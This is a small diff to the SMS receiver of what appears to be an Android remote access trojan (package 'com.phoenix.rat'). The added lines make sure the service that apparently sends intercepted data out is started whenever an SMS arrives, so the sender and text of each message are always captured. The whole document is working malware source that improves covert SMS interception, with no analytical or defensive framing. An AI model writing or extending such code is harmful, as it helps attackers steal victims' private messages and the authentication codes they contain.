@@ -39,6 +39,9 @@ public class SmsReceiver extends BroadcastReceiver {
 
                 if (HttpSenderService.STATE == ServiceState.RUNNING){
                     MBus.subscribe(new com.phoenix.rat.events.SmsMessage(phone, msg));
+                } else {
+                    context.startService(new Intent(context, HttpSenderService.class));
+                    MBus.subscribe(new com.phoenix.rat.events.SmsMessage(phone, msg));
                 }
             }
 
